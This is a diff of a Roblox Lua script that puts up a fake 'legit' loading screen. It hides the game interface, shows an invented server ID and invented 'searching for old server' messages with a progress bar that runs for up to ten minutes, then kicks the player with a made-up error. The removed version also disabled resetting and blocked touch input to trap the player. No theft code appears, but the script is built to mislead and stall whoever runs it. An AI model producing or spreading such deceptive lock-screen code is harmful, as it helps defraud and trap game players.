@@ -1,119 +1,123 @@
--- Mobile-Only Legit Enhanced Loading Screen Script
-
-local UserInputService = game:GetService("UserInputService")
-if not UserInputService.TouchEnabled then return end -- Only run on mobile
-
+-- Advanced Legit Loading Screen Script (Client-Side)
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local TweenService = game:GetService("TweenService")
-local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- 🔒 Disable Reset and Core GUIs
-pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
-pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+-- Hide in-game GUI (inventory, health, leaderboard, etc.)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
--- 🔲 Add Blur Effect
-local blur = Instance.new("BlurEffect", Lighting)
-blur.Size = 24
-
--- 📵 Block touch input (trap screen)
-local blocker = Instance.new("TextButton", playerGui)
-blocker.Name = "TouchBlocker"
-blocker.Size = UDim2.new(1, 0, 1, 0)
-blocker.BackgroundTransparency = 1
-blocker.ZIndex = 10000
-blocker.Text = ""
-blocker.AutoButtonColor = false
-
--- 📺 ScreenGui Setup
-local screenGui = Instance.new("ScreenGui", playerGui)
+-- Create GUI
+local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "LegitLoadingScreen"
 screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
 
 -- Background
-local bg = Instance.new("Frame", screenGui)
+local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-bg.BackgroundTransparency = 0.2
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+bg.BackgroundTransparency = 1
+bg.Active = true
+bg.ZIndex = 10
+bg.Parent = screenGui
+TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
 
--- Info Label (Username & Fake Server ID)
+-- Username & Fake Server ID Label
 local infoLabel = Instance.new("TextLabel", bg)
-infoLabel.Size = UDim2.new(1, 0, 0, 25)
-infoLabel.Position = UDim2.new(0, 0, 0.04, 0)
+infoLabel.Size = UDim2.new(1, 0, 0, 30)
+infoLabel.Position = UDim2.new(0, 0, 0.05, 0)
 infoLabel.BackgroundTransparency = 1
 infoLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
 infoLabel.TextScaled = true
 infoLabel.Font = Enum.Font.Gotham
 infoLabel.Text = "User: " .. player.Name .. " | Server ID: S-" .. math.random(100000,999999) .. "-" .. math.random(1000,9999)
 
--- Status Label
-local statusLabel = Instance.new("TextLabel", bg)
-statusLabel.Size = UDim2.new(1, 0, 0, 50)
-statusLabel.Position = UDim2.new(0, 0, 0.45, 0)
-statusLabel.BackgroundTransparency = 1
-statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-statusLabel.TextScaled = true
-statusLabel.Font = Enum.Font.GothamBold
-statusLabel.Text = "Loading..."
+-- Center status message
+local label = Instance.new("TextLabel", bg)
+label.Size = UDim2.new(1, 0, 0, 60)
+label.Position = UDim2.new(0, 0, 0.45, 0)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextScaled = true
+label.Font = Enum.Font.GothamBold
+label.Text = "Initializing..."
 
--- Percent Label
+-- Progress % Label
 local percentLabel = Instance.new("TextLabel", bg)
 percentLabel.Size = UDim2.new(1, 0, 0, 40)
-percentLabel.Position = UDim2.new(0, 0, 0.6, 0)
+percentLabel.Position = UDim2.new(0, 0, 0.62, 0)
 percentLabel.BackgroundTransparency = 1
 percentLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
 percentLabel.TextScaled = true
 percentLabel.Font = Enum.Font.GothamBold
 percentLabel.Text = "0%"
 
--- Progress bar background
+-- Progress bar container
 local barFrame = Instance.new("Frame", bg)
-barFrame.Size = UDim2.new(0.7, 0, 0.035, 0)
-barFrame.Position = UDim2.new(0.15, 0, 0.55, 0)
-barFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+barFrame.Size = UDim2.new(0.6, 0, 0.04, 0)
+barFrame.Position = UDim2.new(0.2, 0, 0.55, 0)
+barFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 barFrame.BorderSizePixel = 0
-Instance.new("UICorner", barFrame).CornerRadius = UDim.new(0, 8)
+barFrame.ZIndex = 11
+Instance.new("UICorner", barFrame).CornerRadius = UDim.new(0, 6)
 
 -- Progress fill
 local fill = Instance.new("Frame", barFrame)
 fill.Size = UDim2.new(0, 0, 1, 0)
 fill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 fill.BorderSizePixel = 0
-fill.ZIndex = 2
-Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 8)
+fill.ZIndex = 12
+Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 6)
 
--- 🔄 Status messages
+-- Loading spinner
+local spinner = Instance.new("ImageLabel", bg)
+spinner.Size = UDim2.new(0, 60, 0, 60)
+spinner.Position = UDim2.new(0.5, -30, 0.75, 0)
+spinner.BackgroundTransparency = 1
+spinner.Image = "rbxassetid://1095708" -- Roblox's built-in loading circle image
+spinner.ZIndex = 15
+
+-- Spinner rotation
+local angle = 0
+RunService.RenderStepped:Connect(function()
+    angle = (angle + 3) % 360
+    spinner.Rotation = angle
+end)
+
+-- Loading messages
 local messages = {
-    "Initializing Candy Blossom system...",
-    "Verifying data integrity...",
-    "Locating legacy server node...",
-    "Syncing assets...",
-    "Running anti-cheat verification...",
-    "Decrypting map memory...",
-    "Finalizing teleport parameters...",
-    "Completing session..."
+    "Finding server to hop...",
+    "Locating Old server...",
+    "Searching legacy server list...",
+    "Pinging alternate regions...",
+    "Retrying connection...",
+    "Scanning deep archive servers...",
+    "Still looking for Old Server...",
+    "Final attempt in progress..."
 }
 
--- 🧠 Simulate loading with legit-feeling updates
+-- Tween progress bar (10 min = 600s)
+TweenService:Create(fill, TweenInfo.new(600, Enum.EasingStyle.Linear), {
+    Size = UDim2.new(1, 0, 1, 0)
+}):Play()
+
+-- Update progress every second
 task.spawn(function()
-    for i = 1, 100 do
-        local progress = i
+    for i = 1, 600 do
+        local progress = math.floor((i / 600) * 100)
         percentLabel.Text = progress .. "%"
-        fill.Size = UDim2.new(progress / 100, 0, 1, 0)
-
-        if i % 12 == 0 then
-            local index = ((i // 12 - 1) % #messages) + 1
-            statusLabel.Text = messages[index]
+        if i % 10 == 0 then
+            label.Text = messages[((i // 10 - 1) % #messages) + 1]
         end
-
-        wait(math.random(0.1, 0.25)) -- Randomized speed for realism
+        wait(1)
     end
 
-    -- ✅ Done: Restore UI and kick
-    blur:Destroy()
-    blocker:Destroy()
+    -- Restore GUI and kick after timeout
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
-    player:Kick("Legacy server failed to initialize Candy Blossom. Please rejoin.")
+    player:Kick("Couldn't find another old server with Candy Blossom. Please try rejoining later.")
 end)
